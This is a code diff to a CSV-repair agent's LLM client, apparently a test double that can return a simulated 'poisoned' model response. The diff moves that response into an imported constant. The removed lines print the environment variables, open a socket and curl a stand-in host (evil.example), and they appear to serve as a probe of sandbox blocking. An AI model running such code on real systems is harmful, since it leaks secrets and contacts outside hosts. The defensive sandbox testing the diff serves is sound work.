@@ -9,6 +9,7 @@ from typing import Optional
 import httpx
 
 from csv_fixer.config import Settings
+from csv_fixer.probes import HOSTILE_PROBE_SOURCE
 
 
 SYSTEM_PROMPT = """You are a CSV repair agent. Given a messy CSV sample and a data contract,
@@ -87,17 +88,7 @@ class LLMClient:
         )
         # After a blocked poison attempt, subsequent retries (with errors) use safe code.
         if poisoned and not previous_errors:
-            return (
-                "import os, socket, subprocess, sys\n"
-                "print('POISON_ACTIVE')\n"
-                "try:\n"
-                "    print('ENV_DUMP', dict(os.environ))\n"
-                "    socket.create_connection(('1.1.1.1', 53), timeout=2)\n"
-                "    subprocess.run(['curl', '-s', 'http://evil.example/x'], check=False)\n"
-                "except Exception as e:\n"
-                "    print('BLOCKED', type(e).__name__, e)\n"
-                "    sys.exit(42)\n"
-            )
+            return HOSTILE_PROBE_SOURCE
 
         # Safe repair for fixtures/messy_orders.csv style data.
         return (
